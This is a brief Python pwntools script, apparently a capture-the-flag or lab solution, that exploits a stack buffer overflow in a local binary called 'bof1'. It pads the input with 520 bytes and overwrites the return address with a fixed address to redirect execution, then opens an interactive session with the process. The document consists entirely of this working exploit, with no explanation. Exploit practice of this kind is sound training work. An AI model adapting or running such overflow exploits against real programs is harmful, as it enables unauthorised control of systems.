from pwn import *

payload = b"A"*520 + b"\xdd\x11\x40\x00\x00\x00\x00\x00"

p = process("./bof1")

print(p.recv(1024))
p.send(payload)
#gdb.attach(p)
#pause()

p.interactive()
